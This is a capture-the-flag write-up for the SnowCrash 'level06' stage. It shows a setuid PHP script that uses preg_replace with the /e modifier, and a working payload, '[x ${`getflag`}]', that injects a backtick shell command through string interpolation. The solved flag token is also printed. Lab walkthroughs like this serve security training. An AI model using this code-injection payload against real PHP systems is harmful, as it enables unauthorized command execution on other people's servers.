## level06

1. Check files in current working directory (home dir)
    - `-rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06*`
    - `-rwxr-x---  1 flag06  level06  356 Mar  5  2016 level06.php*`

`level06.php` contains :
```
#!/usr/bin/php
<?php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
$r = x($argv[1], $argv[2]); print $r;
?>
```

Prettified :
```bash
#!/usr/bin/php
<?php

function y($m) {
        $m = preg_replace("/\./", " x ", $m); // replace '.' with ' x ' 
        $m = preg_replace("/@/", " y", $m); // replace '@' with ' y'
        return $m;
}

function x($y, $z) {
        $a = file_get_contents($y); // reads $argv[1] 
        $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); // evaluates the content of $argv[1] as a function, if \[x (.*)\] is found
        $a = preg_replace("/\[/", "(", $a); // replace '[' with '('
        $a = preg_replace("/\]/", ")", $a); // replace ']' with ')'
        return $a;
}

$r = x($argv[1], $argv[2]);
```

PHP docs:
> When using the deprecated `e` modifier, this function escapes some characters (namely `'`, `"`, `\` and NULL) in the strings that replace the backreferences.

complex string interpolation syntax + backticks operator:
```
level06@SnowCrash:~$ echo '[x ${`getflag`}]' > /dev/shm/asdf
level06@SnowCrash:~$ ./level06 /dev/shm/asdf
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 in /home/user/level06/level06.php(4) : regexp code on line 1
```